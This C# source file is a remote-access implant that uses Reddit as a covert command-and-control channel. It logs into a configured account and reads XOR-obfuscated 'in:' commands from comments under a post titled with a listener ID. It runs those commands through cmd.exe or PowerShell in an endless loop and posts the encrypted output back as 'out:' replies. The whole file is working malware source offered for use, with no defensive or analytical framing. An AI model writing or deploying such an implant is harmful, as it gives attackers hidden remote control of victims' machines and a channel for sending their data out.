﻿using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using RedditSharp;
using System.Net;
using System.Threading;
using RedditSharp.Things;
using System.Collections;
using System.Xml.Linq;
using System.Diagnostics;
using System.Globalization;


public class Implant
{
    public static string Encrypt(string message, string key)
    {
        int keyLength = key.Length;
        int messageLength = message.Length;

        // Encrypt the message with XOR
        StringBuilder encryptedMessage = new StringBuilder();
        for (int i = 0; i < messageLength; i++)
        {
            encryptedMessage.Append((char)(message[i] ^ key[i % keyLength]));
        }

        // Encode the encrypted message with Base64
        return Convert.ToBase64String(Encoding.UTF8.GetBytes(encryptedMessage.ToString()));
    }

    public static string Decrypt(string encryptedMessage, string key)
    {
        int keyLength = key.Length;
        int encryptedMessageLength = encryptedMessage.Length;

        // Decode the encrypted message with Base64
        byte[] decodedMessageBytes = Convert.FromBase64String(encryptedMessage);
        string decodedMessage = Encoding.UTF8.GetString(decodedMessageBytes);

        // Decrypt the message with XOR
        StringBuilder message = new StringBuilder();
        for (int i = 0; i < decodedMessage.Length; i++)
        {
            message.Append((char)(decodedMessage[i] ^ key[i % keyLength]));
        }

        return message.ToString();
    }

    static void Main(string[] args)
    {
        //------ CONFIGURATIONS HERE -------
        string username = "myUsername";
        string password = "myPassword";
        string subreddit = "mySubreddit";
        string listenerID = "myListener";
        string xorkey = "myxorkey";
        //----------------------------------

        //run the implant infinite times
        while (true)
        {
            string output = "";
            string command = readTask(username, password, subreddit, listenerID, xorkey);
            //Console.WriteLine(command);
            output = runTask(command);
            //Console.WriteLine(output);
            sendOutput(command, output, username, password, subreddit, listenerID, xorkey);
        }
    }

    static string runTask(string command)
    {
        string filename = "";
        string argument = "";

        if (command.Contains("run"))
        {
            command = command.Remove(0, 4);
            filename = "cmd.exe";
            argument = "/C";
        }

        else if (command.Contains("powershell"))
        {
            command = command.Remove(0, 11);
            filename = "powershell.exe";
            argument = "";
        }

        // Start the child process.
        Process p = new Process();
        // Redirect the output stream of the child process.
        p.StartInfo.UseShellExecute = false;
        p.StartInfo.RedirectStandardOutput = true;
        p.StartInfo.FileName = filename;
        p.StartInfo.Arguments = argument + command;
        p.Start();
        // Read the output stream first and then wait.
        string output = p.StandardOutput.ReadToEnd();
        p.WaitForExit();
        Console.WriteLine(output);

        return output;
    }

    static void sendOutput(string command, string output, string username, string password, string subreddit_name, string listenerID, string xorkey)
    {
        //encrypt and encode to base64
        string ciphertext = Encrypt(output, xorkey);

        var reddit = new Reddit();
        reddit.User = reddit.LogIn(username, password);
        var subreddit = reddit.GetSubreddit("/r/" + subreddit_name);

        foreach (var post in subreddit.New.Take(50))
        {
            if (post.Title == listenerID)
            {
                foreach (var comment in post.Comments)
                {
                    if (comment.Body.Contains("in:"))
                    {
                        using (WebClient client = new WebClient())
                        {
                            comment.Reply("out: b'" + ciphertext + "'"); //out: b'base64' which is recognized by python pattern
                            System.Threading.Thread.Sleep(3000);
                            //add (executed) to the reply to tell the implant to not execute it twice, this is already done in teamserver
                            //comment.EditText("executed");
                        }
                    }
                }
            }
        }
    }

    static string readTask(string username, string password, string subreddit_name, string listenerID, string xorkey)
    {
        var reddit = new Reddit();
        reddit.User = reddit.LogIn(username, password);
        var subreddit = reddit.GetSubreddit("/r/" + subreddit_name);
        List<string> list1 = new List<string> { };

        foreach (var post in subreddit.New.Take(50))
        {
            if (post.Title == listenerID)
            {
                foreach (var comment in post.Comments)
                {
                    if (comment.Body.Contains("in:"))
                    {
                        //if the string "executed" is not part of the reply, it means it's a queued task ready to be executed
                        if (!comment.Body.Contains("executed"))
                        {
                            list1.Add(comment.Body);
                        }
                    }
                }
            }
        }
        if (list1.Count != 0)
        { //if there is a command appeneded in list, execute it
            var command = (list1.Last());
            //if the latest in: comment doesn't have a reply in it, execute it
            command = command.Substring(6);
            command = command.Remove(command.Length - 1);

            //decode and decrypt the command
            string deciphertext = Decrypt(command, xorkey);

            //free the list
            list1.Clear();
            return deciphertext;
        }

        //use recursion to execute the readTask() again, since no new command is retrieved
        else
        {
            Console.WriteLine("[+] No task detected, searching again...");
            return readTask(username, password, subreddit_name, listenerID, xorkey);
        }
    }
}
